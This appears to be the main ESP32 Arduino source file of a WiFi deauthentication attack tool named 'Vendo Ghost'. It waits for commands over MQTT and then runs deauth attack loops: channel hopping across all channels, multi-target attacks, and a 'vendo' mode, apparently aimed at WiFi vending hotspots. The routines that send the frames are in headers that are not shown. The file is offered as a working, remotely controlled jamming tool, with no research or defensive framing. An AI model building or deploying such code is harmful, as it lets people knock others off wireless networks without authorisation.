#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"
#include "remote_control.h"
#include "attack_manager.h"

int curr_channel = 1;

void setup() {
  Serial.begin(115200);
  
#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  randomSeed(analogRead(0));
  
  // Initialize all managers
  RemoteControl::begin();
  
  Serial.println("\n✅ Vendo Ghost Ready - MQTT Mode");
  Serial.println("📡 Waiting for commands via MQTT...");
}

void loop() {
  if (RemoteControl::isAttackActive()) {
    // Attack mode - run attack loop AND check MQTT timer
    AttackManager::runAttackLoop(true, RemoteControl::attackPaused);
    RemoteControl::loop();
    
  } else if (RemoteControl::shouldAttack()) {
    // Legacy/fallback attack modes
    if (deauth_type == DEAUTH_TYPE_ALL) {
      if (curr_channel > CHANNEL_MAX) curr_channel = 1;
      esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
      curr_channel++;
      delay(10);
    } else if (deauth_type == DEAUTH_TYPE_MULTI) {
      update_multi_attack();
      delay(10);
    } else if (deauth_type == DEAUTH_TYPE_VENDO) {
      update_vendo_ghost();
      delay(10);
    } else {
      delay(100);
    }
    RemoteControl::loop();
    
  } else {
    // Standby mode - maintain MQTT connection
    RemoteControl::loop();
    delay(10);
  }
}